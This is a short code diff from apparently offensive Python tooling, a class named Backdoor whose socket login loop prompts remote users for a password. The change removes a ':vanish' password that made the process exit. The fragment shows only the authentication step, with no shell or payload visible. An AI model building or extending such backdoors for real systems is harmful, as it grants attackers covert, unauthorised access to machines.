@@ -29,8 +29,6 @@ class Backdoor(object):
         while True:
             self.__sock.send('Login: '.encode())
             passwd = self.__sock.recv(1024).decode().strip()
-            if passwd == ':vanish':
-                os._exit(0)
             if self.__passwd == passwd:
                 return True
 
